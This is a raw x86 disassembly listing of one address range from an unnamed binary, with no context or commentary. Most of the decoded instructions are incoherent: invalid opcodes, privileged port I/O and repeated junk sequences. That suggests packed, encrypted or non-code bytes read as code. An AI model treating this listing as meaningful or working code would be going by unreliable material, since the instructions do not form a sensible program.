  42356b:	cmp    BYTE PTR [edi+esi*2+0x1e],bh
  42356f:	fisub  WORD PTR [edi+ebp*2]
  423572:	cmp    BYTE PTR [eax-0xf7fb989],al
  423578:	inc    esi
  423579:	push   ebx
  42357a:	je     0x4235cf
  42357c:	push   ecx
  42357d:	mov    dl,0xba
  42357f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423585:	xor    al,0x84
  423588:	arpl   bp,di
  42358a:	or     DWORD PTR [edi],ecx
  42358c:	pop    ss
  42358d:	in     al,dx
  42358e:	lea    ecx,[ebp-0x72f35f42]
  423594:	lea    eax,[eax+0x77803ef0]
  42359a:	adc    BYTE PTR ds:[edi+0x53fc5356],0x11
  4235a2:	mov    dl,0x84
  4235a4:	sub    DWORD PTR [edx-0x200f342],esi
  4235aa:	xor    BYTE PTR [edi-0x7c],0x43
  4235ae:	sti    
  4235af:	push   ebx
  4235b0:	jb     0x4235fd
  4235b2:	add    eax,0x807a7750
  4235b7:	ja     0x4235d7
  4235b9:	xor    al,0x1e
  4235bc:	push   ebx
  4235bd:	je     0x423612
  4235bf:	push   ecx
  4235c0:	mov    dl,0xba
  4235c2:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4235c8:	xor    al,0x7a
  4235cb:	arpl   bp,di
  4235cd:	fst    DWORD PTR [edi]
  4235cf:	xor    BYTE PTR [edi+0x1e],0x80
  4235d3:	lock push ds
  4235d5:	push   ebx
  4235d6:	je     0x42362b
  4235d8:	push   ecx
  4235d9:	mov    dl,0x86
  4235db:	or     al,0xb2
  4235dd:	mov    edx,0x50b2ff29
  4235e2:	ja     0x42365e
  4235e4:	xor    BYTE PTR [edi+0x3e],0x80
  4235e8:	lock ds push ebx
  4235eb:	je     0x423640
  4235ed:	push   ecx
  4235ee:	mov    dl,0x86
  4235f0:	or     al,0xb2
  4235f2:	mov    edx,0x80b2ff29
  4235f7:	lock jp 0x423603
  4235fa:	and    dh,BYTE PTR [edx-0x7f8588b0]
  423600:	ja     0x423648
  423602:	xor    al,0x46
  423605:	push   ebx
  423606:	je     0x42365b
  423608:	push   ecx
  423609:	mov    dl,0xba
  42360b:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423611:	xor    al,0x7a
  423614:	arpl   bp,di
  423616:	or     DWORD PTR [edi],ecx
  423618:	(bad)  
  423619:	or     al,0x8d
  42361b:	lea    eax,[eax+0x77507a77]
  423621:	scas   eax,DWORD PTR es:[edi]
  423622:	xor    BYTE PTR [edi+0x56],0xec
  423626:	ja     0x42368a
  423628:	push   eax
  423629:	out    0x7a,eax
  42362b:	push   eax
  42362c:	ja     0x423698
  42362e:	pop    esi
  42362f:	cmc    
  423630:	and    al,0x6f
  423632:	cmp    BYTE PTR [eax+0x77],dl
  423635:	pop    esi
  423636:	jl     0x4236af
  423638:	push   ss
  423639:	hlt    
  42363a:	and    al,0x6f
  42363c:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423640:	repz and al,0x6f
  423643:	cmp    BYTE PTR [eax+0x77],dl
  423646:	test   DWORD PTR [eax-0xf7f8589],0x5374537a
  423650:	push   ecx
  423651:	mov    dl,0x86
  423653:	or     al,0xb2
  423655:	mov    edx,0x50b2ff29
  42365a:	ja     0x423659
  42365c:	sub    BYTE PTR [edx-0x42],0x4f
  423660:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423666:	dec    edi
  423667:	or     cl,BYTE PTR [ebp+0x4d]
  42366a:	dec    ebp
  42366b:	jmp    0x7c6a:0x80386f24
  423672:	dec    edi
  423673:	xchg   ebp,eax
  423674:	dec    ebp
  423675:	dec    ebp
  423676:	dec    ebp
  423677:	or     esp,DWORD PTR [edi+ebp*2]
  42367a:	cmp    BYTE PTR [eax-0x7f957f96],al
  423680:	ja     0x423679
  423682:	xor    al,0xf7
  423685:	push   ebx
  423686:	je     0x4236db
  423688:	push   ecx
  423689:	mov    dl,0x86
  42368b:	or     al,0xb2
  42368d:	mov    edx,0x80b2ff29
  423692:	lock std 
  423694:	or     DWORD PTR [edx],esp
  423696:	mov    dl,0x80
  423698:	lock push 0xffffff8f
  42369b:	out    dx,al
  42369c:	out    dx,eax
  42369d:	adc    BYTE PTR [edi+0x4],dh
  4236a0:	sub    BYTE PTR [edx-0x80],0x77
  4236a4:	test   DWORD PTR [eax+0x5153f7f0],0xbab27453
  4236ae:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4236b4:	xor    al,0xfd
  4236b7:	or     DWORD PTR [edx],esp
  4236b9:	mov    dl,0x80
  4236bb:	lock push ss
  4236bd:	adc    BYTE PTR [edi+0x53115316],0x7e
  4236c4:	mov    dl,0xbe
  4236c6:	or     al,0xb2
  4236c8:	clc    
  4236c9:	sub    edi,edi
  4236cb:	(bad)  
  4236cc:	in     al,dx
  4236cd:	mov    dl,0x80
  4236cf:	lock push 0x9
  4236d2:	loopne 0x4236f5
  4236d4:	out    dx,eax
  4236d5:	or     BYTE PTR [edi+0xa],0x4d
  4236d9:	dec    ebp
  4236da:	dec    ebp
  4236db:	sbb    BYTE PTR [eax],0xa
  4236de:	dec    ebp
  4236df:	dec    ebp
  4236e0:	dec    ebp
  4236e1:	push   ebx
  4236e2:	je     0x423737
  4236e4:	jle    0x423698
  4236e6:	xchg   BYTE PTR [edx+esi*4],cl
  4236e9:	clc    
  4236ea:	sub    edi,edi
  4236ec:	sti    
  4236ed:	in     al,dx
  4236ee:	mov    dl,0x9
  4236f0:	loopne 0x4236e2
  4236f2:	add    al,0x53
  4236f4:	std    
  4236f5:	adc    al,dh
  4236f7:	add    al,0x80
  4236f9:	push   0xffffff8f
  4236fb:	ja     0x423701
  4236fd:	xor    al,0xf7
  423700:	adc    BYTE PTR [edi+0x531153f7],0x7e
  423707:	mov    dl,0xf8
  423709:	sub    DWORD PTR [edx-0x100f342],esi
  42370f:	adc    BYTE PTR [edi-0x1ddf603],0x80
  423716:	xchg   edi,eax
  423717:	push   0x10
  423719:	out    dx,al
  42371a:	push   cs
  42371b:	sub    BYTE PTR [edx-0x80],0x77
  42371f:	test   DWORD PTR [eax+0x7453f7f0],0x86b25153
  423729:	or     al,0xb2
  42372b:	mov    edx,0x80b2ff29
  423730:	lock std 
  423732:	or     DWORD PTR [edx],esp
  423734:	mov    dl,0x80
  423736:	lock push 0xffffff8f
  423739:	out    dx,al
  42373a:	out    dx,eax
  42373b:	adc    BYTE PTR [edi+0x4],dh
  42373e:	sub    BYTE PTR [edx-0x80],0x77
  423742:	test   DWORD PTR [eax+0x7453f7f0],0x530c86b2
  42374c:	push   ecx
  42374d:	mov    dl,0xba
  42374f:	sub    edi,edi
  423751:	mov    dl,0x80
  423753:	lock std 
  423755:	or     DWORD PTR [edx],esp
  423757:	mov    dl,0x80
  423759:	lock pop esi
  42375b:	adc    BYTE PTR [edi+0x5311535e],0x7e
  423762:	mov    dl,0xbe
  423764:	or     al,0xb2
  423766:	clc    
  423767:	sub    edi,edi
  423769:	(bad)  
  42376a:	in     al,dx
  42376b:	mov    dl,0x80
  42376d:	lock push 0x9
  423770:	loopne 0x423793
  423772:	out    dx,eax
  423773:	or     BYTE PTR [edi-0x6b],0x4d
  423777:	dec    ebp
  423778:	dec    ebp
  423779:	sbb    BYTE PTR [eax],0x95
  42377c:	dec    ebp
  42377d:	dec    ebp
  42377e:	dec    ebp
  42377f:	push   ebx
  423780:	je     0x4237d5
  423782:	jle    0x423736
  423784:	xchg   BYTE PTR [edx+esi*4],cl
  423787:	clc    
  423788:	sub    edi,edi
  42378a:	sti    
  42378b:	in     al,dx
  42378c:	mov    dl,0x9
  42378e:	loopne 0x423780
  423790:	add    al,0x53
  423792:	std    
  423793:	adc    al,dh
  423795:	add    al,0x80
  423797:	push   0xffffff8f
  423799:	ja     0x42379f
  42379b:	xor    al,0xf7
  42379e:	adc    BYTE PTR [edi+0x531153f7],0x7e
  4237a5:	mov    dl,0xf8
  4237a7:	sub    DWORD PTR [edx-0x100f342],esi
  4237ad:	adc    BYTE PTR [edi-0x1ddf603],0x80
  4237b4:	xchg   edi,eax
  4237b5:	push   0x10
  4237b7:	out    dx,al
  4237b8:	push   cs
  4237b9:	sub    BYTE PTR [edx-0x80],0x77
  4237bd:	ss xor al,0x36
  4237c1:	push   ebx
  4237c2:	push   ecx
  4237c3:	push   ebx
  4237c4:	je     0x423778
  4237c6:	mov    edx,0xc86b229
  4237cb:	push   DWORD PTR [edx-0x7fa10f80]
  4237d1:	xchg   edi,eax
  4237d2:	pop    esi
  4237d3:	push   ebx
  4237d4:	adc    DWORD PTR [ebx+0x7e],edx
  4237d7:	mov    dl,0xbe
  4237d9:	or     al,0xb2
  4237db:	clc    
  4237dc:	sub    edi,edi
  4237de:	dec    BYTE PTR [ecx]
  4237e0:	and    dh,BYTE PTR [edx+0x50fd77ec]
  4237e6:	ja     0x4237e5
  4237e8:	xor    BYTE PTR [edi-0x3],0x80
  4237ec:	lock scas eax,DWORD PTR es:[edi]
  4237ee:	arpl   bp,di
  4237f0:	or     edx,ebp
  4237f2:	(bad)  
  4237f3:	or     eax,0x77804d4d
  4237f8:	pop    esi
  4237f9:	xor    al,0x5e
  4237fc:	push   ebx
  4237fd:	push   ecx
  4237fe:	mov    dl,0xba
  423800:	sub    DWORD PTR [ebx+0x74],edx
  423803:	mov    dl,0x86
  423805:	or     al,0xff
  423807:	mov    dl,0x80
  423809:	lock scas eax,DWORD PTR es:[edi]
  42380b:	or     DWORD PTR [edx],esp
  42380d:	mov    dl,0x80
  42380f:	lock jp 0x423865
  423812:	adc    DWORD PTR [edx-0x4d00f342],esi
  423818:	xor    al,0x7a
  42381b:	push   ebx
  42381c:	push   ecx
  42381d:	mov    dl,0xba
  42381f:	sub    edi,edi
  423821:	mov    dl,0x50
  423823:	ja     0x42385b
  423825:	xor    BYTE PTR [edi-0x7e],0x80
  423829:	lock adc BYTE PTR [ebx+0x51],0xb2
  42382e:	mov    edx,0xb2745329
  423833:	xchg   BYTE PTR [edi+edi*8],cl
  423836:	mov    dl,0x80
  423838:	lock add BYTE PTR [eax+0x11538297],0xb2
  423840:	mov    esi,0xb27e530c
  423845:	clc    
  423846:	sub    edi,edi
  423848:	(bad)  
  423849:	in     al,dx
  42384a:	lock ss in al,dx
  42384d:	std    
  42384e:	in     al,dx
  42384f:	lock push esi
  423851:	push   eax
  423852:	lock push esi
  423854:	les    ebx,FWORD PTR ds:0x80827780
  42385a:	lock adc BYTE PTR [ebx+0x74],0x53
  42385f:	push   ecx
  423860:	mov    dl,0x86
  423862:	or     al,0xb2
  423864:	mov    edx,0xecb2ff29
  423869:	ja     0x4238c1
  42386b:	push   eax
  42386c:	ja     0x4238c4
  42386e:	xor    BYTE PTR [edi-0x7e],0x80
  423872:	lock adc BYTE PTR [ebx+0x74],0xb2
  423877:	xchg   BYTE PTR [ebx+edx*2],cl
  42387a:	push   ecx
  42387b:	mov    dl,0xba
  42387d:	sub    edi,edi
  42387f:	mov    dl,0x80
  423881:	lock test BYTE PTR [ebx-0x3],al
  423885:	xor    BYTE PTR [edi-0x7e],0x80
  423889:	xchg   edi,eax
  42388a:	adc    BYTE PTR [ebx+0x74],0x53
  42388e:	jle    0x423842
  423890:	clc    
  423891:	sub    DWORD PTR [edx-0x400f37a],esi
  423897:	adc    BYTE PTR [edi-0x4ddf6aa],0x63
  42389e:	mov    dl,0x9
  4238a0:	dec    esp
  4238a1:	xor    cl,BYTE PTR [edx+0x77804d4d]
  4238a7:	mov    eax,DWORD PTR [eax+0x77808b77]
  4238ad:	mov    dl,BYTE PTR [eax+0x77]
  4238b0:	xor    BYTE PTR ss:[edi-0x11],0x80
  4238b5:	lock adc BYTE PTR es:[edi-0x4deeacda],0xbe
  4238be:	or     al,0x53
  4238c0:	jle    0x423842
  4238c2:	int    0x32
  4238c4:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  4238ca:	(bad)  
  4238cb:	(bad)  
  4238cc:	xchg   esi,eax
  4238cd:	xor    al,0x66
  4238d0:	adc    BYTE PTR [edi+0x53115366],0x7e
  4238d7:	mov    dl,0xbe
  4238d9:	or     al,0xb2
  4238db:	clc    
  4238dc:	sub    edi,edi
  4238de:	(bad)  
  4238df:	xchg   esi,eax
  4238e0:	xor    al,0x8b
  4238e3:	adc    BYTE PTR [edi+0x36d74d8b],0x53
  4238ea:	adc    DWORD PTR [ebx+0x7e],edx
  4238ed:	mov    dl,0xbe
  4238ef:	or     al,0xb2
  4238f1:	clc    
  4238f2:	sub    edi,edi
  4238f4:	(bad)  
  4238f5:	xchg   esi,eax
  4238f6:	dec    ebp
  4238f7:	or     dl,BYTE PTR ds:0x808bf080
  4238fd:	xchg   edi,eax
  4238fe:	mov    edx,DWORD PTR [ebx+0x11]
  423901:	push   ebx
  423902:	jle    0x4238b6
  423904:	mov    esi,0x29f8b20c
  423909:	(bad)  
  42390a:	(bad)  
  42390b:	push   eax
  42390c:	ja     0x423974
  42390e:	arpl   bp,di
  423910:	or     DWORD PTR [edi],ecx
  423912:	cmp    al,0x8d
  423914:	lea    ecx,[ebp-0x3b748880]
  42391a:	lock adc BYTE PTR [edi-0x7b88af9a],0x6e
  423922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423923:	test   BYTE PTR [eax-0x414d7b10],al
  423929:	or     al,0x53
  42392b:	cld    
  42392c:	mov    dl,0x84
  42392e:	sub    edi,edi
  423930:	mov    dl,0x80
  423932:	lock jbe 0x4238c4
  423935:	and    DWORD PTR [edx],edi
  423937:	adc    BYTE PTR [ecx],ah
  423939:	jno    0x4238bb
  42393b:	lock stc 
  42393d:	xor    al,0xf9
  423940:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423947:	mov    dl,0xf8
  423949:	sub    DWORD PTR [edx-0x100f342],esi
  42394f:	adc    BYTE PTR [edi-0x7f021307],0x77
  423956:	test   BYTE PTR [ebx-0x6c],dl
  423959:	in     eax,dx
  42395a:	test   BYTE PTR [edx-0x4d750713],cl
  423960:	mov    esi,0xfffbec29
  423965:	mov    dl,0x53
  423967:	jl     0x4238e9
  423969:	lock mov al,BYTE PTR [eax-0x74d7569]
  423970:	or     al,0xb2
  423972:	mov    esi,0x53b6ff29
  423977:	pushf  
  423978:	arpl   bx,di
  42397a:	xlat   BYTE PTR ds:[ebx]
  42397b:	sub    al,0x80
  42397d:	ja     0x42396e
  42397f:	xor    al,0x2e
  423982:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  423989:	lea    ecx,[ebp+0x7e531153]
  42398f:	mov    dl,0xbe
  423991:	or     al,0xb2
  423993:	clc    
  423994:	sub    edi,edi
  423996:	(bad)  
  423997:	xchg   esi,eax
  423998:	xor    al,0x8b
  42399b:	adc    BYTE PTR [edi+0x5311538b],0x7e
  4239a2:	mov    dl,0xbe
  4239a4:	or     al,0xb2
  4239a6:	clc    
  4239a7:	sub    edi,edi
  4239a9:	(bad)  
  4239aa:	xchg   esi,eax
  4239ab:	dec    ebp
  4239ac:	xlat   BYTE PTR ds:[ebx]
  4239ad:	jbe    0x4239fc
  4239af:	or     bl,BYTE PTR ds:0x50667780
  4239b5:	ja     0x423a2d
  4239b7:	xor    BYTE PTR [edi+0x36],0x50
  4239bb:	ja     0x423947
  4239bd:	xor    BYTE PTR [edi-0x76],0x53
  4239c1:	jo     0x4239b0
  4239c3:	xchg   dh,ch
  4239c5:	aad    0x43
  4239c7:	xor    BYTE PTR [edi+0x76],0x80
  4239cb:	adc    eax,0x767780ef
  4239d0:	sub    dh,0xef
  4239d3:	push   ebx
  4239d4:	cld    
  4239d5:	push   ebx
  4239d6:	xchg   esp,eax
  4239d7:	mov    dl,0x84
  4239d9:	sub    DWORD PTR [edx-0x400f3f9],esi
  4239df:	adc    BYTE PTR [edi-0x5911af8a],0x80
  4239e6:	ja     0x423972
  4239e8:	in     eax,dx
  4239e9:	mov    dl,0xee
  4239eb:	in     eax,dx
  4239ec:	xchg   dh,ch
  4239ee:	arpl   bp,di
  4239f0:	in     al,0x98
  4239f2:	xor    BYTE PTR [edi-0x76],0x53
  4239f6:	jo     0x4239e5
  4239f8:	xchg   dh,ch
  4239fa:	aad    0x43
  4239fc:	xor    BYTE PTR [edi+0x76],0x80
  423a00:	adc    eax,0x767780ef
  423a05:	sub    dh,0xef
  423a08:	push   ebx
  423a09:	cld    
  423a0a:	push   ebx
  423a0b:	xchg   esp,eax
  423a0c:	mov    dl,0x84
  423a0e:	sub    DWORD PTR [edx-0x400f3f9],esi
  423a14:	adc    BYTE PTR [edi-0x5911af8a],0x80
  423a1b:	ja     0x4239a7
  423a1d:	in     eax,dx
  423a1e:	mov    dl,0xee
  423a20:	in     eax,dx
  423a21:	xchg   dh,ch
  423a23:	arpl   bp,di
  423a25:	in     al,0x98
  423a27:	xor    BYTE PTR [edi+0x76],0x80
  423a2b:	lock stc 
  423a2d:	push   eax
  423a2e:	ja     0x4239df
  423a30:	xor    BYTE PTR [edi-0x7],0x53
  423a34:	adc    DWORD PTR [ebx-0x4],edx
  423a37:	mov    dl,0x84
  423a39:	sub    DWORD PTR [edx-0x200f342],esi
  423a3f:	xor    BYTE PTR [edi-0x75],0x50
  423a43:	lock es jl 0x423abe
  423a47:	inc    ecx
  423a48:	ins    DWORD PTR es:[edi],dx
  423a49:	pop    ebp
  423a4a:	ins    DWORD PTR es:[edi],dx
  423a4b:	aas    
  423a4c:	jl     0x423ac5
  423a4e:	pop    edx
  423a4f:	ins    DWORD PTR es:[edi],dx
  423a50:	inc    ebx
  423a51:	ins    DWORD PTR es:[edi],dx
  423a52:	push   ebx
  423a53:	push   eax
  423a54:	ja     0x423abc
  423a56:	fsub   QWORD PTR [si]
  423a59:	outs   dx,DWORD PTR ds:[esi]
  423a5a:	cmp    BYTE PTR [ecx],cl
  423a5c:	jg     0x80cfc7ef
  423a62:	xchg   edi,eax
  423a63:	scas   eax,DWORD PTR es:[edi]
  423a64:	cmp    ch,0x53
  423a67:	adc    DWORD PTR [eax-0x10],edx
  423a6a:	test   BYTE PTR [edx+0x530c84c7],dh
  423a70:	cld    
  423a71:	mov    dl,0x84
  423a73:	sub    edi,edi
  423a75:	ja     0x4239fb
  423a77:	push   eax
  423a78:	lock bound ecx,QWORD PTR [edi+0x9412f31]
  423a7f:	cli    
  423a80:	out    dx,al
  423a81:	jno    0x423a50
  423a83:	add    eax,0xbdbecdcd
  423a88:	or     eax,esp
  423a8a:	jo     0x423aef
  423a8c:	mov    dl,0xd7
  423a8e:	fiadd  DWORD PTR [eax-0xf7f0689]
  423a94:	stc    
  423a95:	xor    BYTE PTR [edi-0x7],0x80
  423a99:	xchg   edi,eax
  423a9a:	stc    
  423a9b:	push   ebx
  423a9c:	cld    
  423a9d:	push   ebx
  423a9e:	adc    DWORD PTR [edx-0x414dd67c],esi
  423aa4:	or     al,0xff
  423aa6:	std    
  423aa7:	xor    BYTE PTR [edi+0x66],0x53
  423aab:	cld    
  423aac:	mov    dl,0x84
  423aae:	sub    edi,edi
  423ab0:	ja     0x423a36
  423ab2:	push   ebx
  423ab3:	xchg   esp,eax
  423ab4:	in     al,dx
  423ab5:	std    
  423ab6:	xor    BYTE PTR [edi+0x62],0xed
  423aba:	test   BYTE PTR [edx-0x4d750713],cl
  423ac0:	mov    esi,0xfff7ec29
  423ac5:	(bad)  
  423ac6:	push   ebx
  423ac7:	sub    al,BYTE PTR [eax+0x66f050b2]
  423acd:	fsub   QWORD PTR [si]
  423ad0:	outs   dx,DWORD PTR ds:[esi]
  423ad1:	cmp    bh,dl
  423ad3:	add    DWORD PTR [eax-0x6f3bd910],eax
  423ad9:	xor    al,0x8b
  423adc:	xor    BYTE PTR [edi-0x75],0x53
  423ae0:	adc    DWORD PTR [ebx-0x4],edx
  423ae3:	mov    dl,0xbe
  423ae5:	or     al,0xb2
  423ae7:	test   BYTE PTR [ecx],ch
  423ae9:	(bad)  
  423aea:	std    
  423aeb:	xor    BYTE PTR [edi-0x75],0x80
  423aef:	xchg   edi,eax
  423af0:	mov    edx,DWORD PTR [ebx+0x74]
  423af3:	push   ebx
  423af4:	jle    0x423aa8
  423af6:	xchg   BYTE PTR [edx+esi*4],cl
  423af9:	clc    
  423afa:	sub    edi,edi
  423afc:	sti    
  423afd:	arpl   WORD PTR [edx+0xc230f09],si
  423b03:	lea    ecx,[ebp-0x7f508880]
  423b09:	ins    DWORD PTR es:[edi],dx
  423b0a:	out    dx,eax
  423b0b:	push   eax
  423b0c:	out    0xf9,eax
  423b0e:	jl     0x423b87
  423b10:	es repz and al,0x6f
  423b14:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423b18:	hlt    
  423b19:	and    al,0x6f
  423b1b:	cmp    BYTE PTR [edi+esi*2+0x7a],bh
  423b1f:	mul    BYTE PTR [ebx+0x777c386f]
  423b25:	test   dl,bh
  423b27:	and    al,0x6f
  423b29:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423b2d:	nop
  423b2e:	shr    BYTE PTR [edi+0x38],1
  423b31:	push   eax
  423b32:	ja     0x423b72
  423b34:	xor    BYTE PTR [edi-0x11],0x80
  423b38:	lock test BYTE PTR [eax+0x11538497],al
  423b3f:	mov    dl,0xbe
  423b41:	or     al,0x53
  423b43:	jle    0x423af7
  423b45:	clc    
  423b46:	sub    edi,edi
  423b48:	(bad)  
  423b49:	xchg   esi,eax
  423b4a:	xor    al,0x7a
  423b4d:	adc    BYTE PTR [edi-0x4deeac86],0xbe
  423b54:	or     al,0x53
  423b56:	jle    0x423ad8
  423b58:	int    0x32
  423b5a:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423b60:	(bad)  
  423b61:	(bad)  
  423b62:	xchg   esi,eax
  423b63:	xor    al,0x66
  423b66:	adc    BYTE PTR [edi+0x53115366],0x7e
  423b6d:	mov    dl,0xbe
  423b6f:	or     al,0xb2
  423b71:	clc    
  423b72:	sub    edi,edi
  423b74:	(bad)  
  423b75:	xchg   esi,eax
  423b76:	xor    al,0xf9
  423b79:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423b80:	mov    dl,0xbe
  423b82:	or     al,0xb2
  423b84:	clc    
  423b85:	sub    edi,edi
  423b87:	(bad)  
  423b88:	xchg   esi,eax
  423b89:	dec    ebp
  423b8a:	or     dl,BYTE PTR ds:0x80667750
  423b90:	ja     0x423b81
  423b92:	xor    al,0x84
  423b95:	adc    BYTE PTR [edi-0x4deeac7c],0xbe
  423b9c:	or     al,0x53
  423b9e:	jle    0x423b20
  423ba0:	int    0x32
  423ba2:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423ba8:	(bad)  
  423ba9:	(bad)  
  423baa:	xchg   esi,eax
  423bab:	xor    al,0x7a
  423bae:	adc    BYTE PTR [edi+0x5311537a],0x7e
  423bb5:	mov    dl,0xbe
  423bb7:	or     al,0xb2
  423bb9:	clc    
  423bba:	sub    edi,edi
  423bbc:	(bad)  
  423bbd:	xchg   esi,eax
  423bbe:	xor    al,0xf9
  423bc1:	adc    BYTE PTR [edi+0x3ed74df9],0x53
  423bc8:	adc    DWORD PTR [ebx+0x7e],edx
  423bcb:	mov    dl,0xbe
  423bcd:	or     al,0xb2
  423bcf:	clc    
  423bd0:	sub    edi,edi
  423bd2:	(bad)  
  423bd3:	xchg   esi,eax
  423bd4:	dec    ebp
  423bd5:	or     dl,BYTE PTR ds:0x50f9f080
  423bdb:	ja     0x423b61
  423bdd:	xor    BYTE PTR [edi-0x7],0x53
  423be1:	adc    DWORD PTR [ebx-0x4],edx
  423be4:	mov    dl,0xbe
  423be6:	or     al,0xb2
  423be8:	test   BYTE PTR [ecx],ch
  423bea:	(bad)  
  423beb:	std    
  423bec:	xor    BYTE PTR [edi+0x66],0x63
  423bf0:	std    
  423bf1:	or     DWORD PTR [edi],ecx
  423bf3:	cmp    eax,0x808d8d2f
  423bf8:	lock stc 
  423bfa:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c01:	mov    dl,0xbe
  423c03:	or     al,0xb2
  423c05:	clc    
  423c06:	sub    edi,edi
  423c08:	(bad)  
  423c09:	arpl   ax,si
  423c0b:	test   BYTE PTR [ecx],cl
  423c0d:	bswap  edi
  423c0f:	das    
  423c10:	lea    ecx,[ebp-0x7fd90f80]
  423c16:	lock es mov dl,0xbe
  423c1a:	or     al,0xcd
  423c1c:	add    eax,0x80ef10c4
  423c21:	lock stc 
  423c23:	xor    al,0xf9
  423c26:	mov    dl,0xbe
  423c28:	or     al,0xcd
  423c2a:	add    eax,0x3a7d10c4
  423c2f:	xor    al,0x36
  423c32:	xor    al,0x36
  423c35:	mov    dl,0xbe
  423c37:	or     al,0xcd
  423c39:	add    eax,0xc7d10c4
  423c3e:	in     eax,dx
  423c3f:	cmp    BYTE PTR ds:0x8d4d4d4d,bl
  423c45:	in     eax,dx
  423c46:	cmp    BYTE PTR ds:0x8d4d4d4d,ah
  423c4c:	add    DWORD PTR [ecx],eax
  423c4e:	and    eax,0x964d4d4d
  423c53:	dec    ebp
  423c54:	xlat   BYTE PTR ds:[ebx]
  423c55:	add    DWORD PTR ds:[ecx],eax
  423c58:	sbb    eax,0x4d4d4d4d
  423c5d:	xlat   BYTE PTR ds:[ebx]
  423c5e:	test   BYTE PTR [esi+0x4daff080],dl
  423c64:	sahf   
  423c65:	and    DWORD PTR [eax-0x4d128910],eax
  423c6b:	jno    0x423c03
  423c6d:	or     al,BYTE PTR [esi+0x4d4d8832]
  423c73:	push   eax
  423c74:	ja     0x423cd8
  423c76:	xor    BYTE PTR [edi-0x11],0x80
  423c7a:	lock adc BYTE PTR cs:[edi+0x32cd802e],0x3a
  423c83:	lea    ecx,[ebp+0x7e531153]
  423c89:	mov    dl,0xbe
  423c8b:	or     al,0xb2
  423c8d:	clc    
  423c8e:	sub    edi,edi
  423c90:	(bad)  
  423c91:	xchg   esi,eax
  423c92:	xor    al,0xf9
  423c95:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c9c:	mov    dl,0xbe
  423c9e:	or     al,0xb2
  423ca0:	clc    
  423ca1:	sub    edi,edi
  423ca3:	(bad)  
  423ca4:	xchg   esi,eax
  423ca5:	dec    ebp
  423ca6:	xlat   BYTE PTR ds:[ebx]
  423ca7:	dec    bp
  423ca9:	or     bl,BYTE PTR ds:0xb2627780
  423caf:	push   0xc
  423cb1:	push   ebx
  423cb2:	jl     0x423d17
  423cb4:	jl     0x423c36
  423cb6:	ja     0x423ca7
  423cb8:	xor    al,0x2e
  423cbb:	or     ch,0x32
  423cbe:	cmp    cl,BYTE PTR [ebp+0x2e97808d]
  423cc4:	xlat   BYTE PTR ds:[ebx]
  423cc5:	push   ebp
  423cc6:	push   ebx
  423cc7:	adc    DWORD PTR [ebx+0x7e],edx
  423cca:	mov    dl,0xbe
  423ccc:	or     al,0xb2
  423cce:	clc    
  423ccf:	sub    edi,edi
  423cd1:	(bad)  
  423cd2:	xchg   esi,eax
  423cd3:	xor    al,0xf9
  423cd6:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423cdd:	mov    dl,0xbe
  423cdf:	or     al,0xb2
  423ce1:	clc    
  423ce2:	sub    edi,edi
  423ce4:	(bad)  
  423ce5:	xchg   esi,eax
  423ce6:	dec    ebp
  423ce7:	xlat   BYTE PTR ds:[ebx]
  423ce8:	jbe    0x423d37
  423cea:	or     bl,BYTE PTR ds:0x50847780
  423cf0:	ja     0x423d68
  423cf2:	xor    BYTE PTR [edi+0x3e],0x50
  423cf6:	ja     0x423c82
  423cf8:	les    edi,FWORD PTR [ecx]
  423cfa:	push   ebx
  423cfb:	adc    DWORD PTR [ebx+0x7e],edx
  423cfe:	mov    dl,0xbe
  423d00:	or     al,0xb2
  423d02:	clc    
  423d03:	sub    edi,edi
  423d05:	(bad)  
  423d06:	xchg   esi,eax
  423d07:	xor    al,0xf9
  423d0a:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423d11:	mov    dl,0xbe
  423d13:	or     al,0xb2
  423d15:	clc    
  423d16:	sub    edi,edi
  423d18:	(bad)  
  423d19:	xchg   esi,eax
  423d1a:	dec    ebp
  423d1b:	xlat   BYTE PTR ds:[ebx]
  423d1c:	test   BYTE PTR [ebp+0xa],cl
  423d1f:	sbb    eax,0x508a7780
  423d24:	ja     0x423d44
  423d26:	xor    BYTE PTR [edi+0x76],0x50
  423d2a:	out    0x56,eax
  423d2c:	push   eax
  423d2d:	ja     0x423d91
  423d2f:	jl     0x423da8
  423d31:	xor    ch,0x24
  423d34:	outs   dx,DWORD PTR ds:[esi]
  423d35:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d3b:	push   esi
  423d3c:	push   ebx
  423d3d:	cld    
  423d3e:	push   ebx
  423d3f:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d45:	or     al,0xff
  423d47:	mov    dl,0x50
  423d49:	ja     0x423d91
  423d4b:	xor    BYTE PTR [edi+0x56],0x80
  423d4f:	lock push esi
  423d51:	push   ebx
  423d52:	cld    
  423d53:	push   ebx
  423d54:	adc    DWORD PTR [edx-0x414dd67c],esi
  423d5a:	or     al,0xff
  423d5c:	mov    dl,0x50
  423d5e:	ja     0x423d0f
  423d60:	jl     0x423dd9
  423d62:	jp     0x423dad
  423d64:	and    al,0x6f
  423d66:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  423d6a:	fisub  WORD PTR [edi+ebp*2]
  423d6d:	cmp    BYTE PTR [eax-0xf7fa989],al
  423d73:	push   esi
  423d74:	push   ebx
  423d75:	cld    
  423d76:	push   ebx
  423d77:	adc    DWORD PTR [edx-0x7b4df342],esi
  423d7d:	sub    edi,edi
  423d7f:	mov    dl,0x80
  423d81:	lock push ds
  423d83:	arpl   bp,di
  423d85:	or     DWORD PTR [edi],ecx
  423d87:	pop    ss
  423d88:	in     al,dx
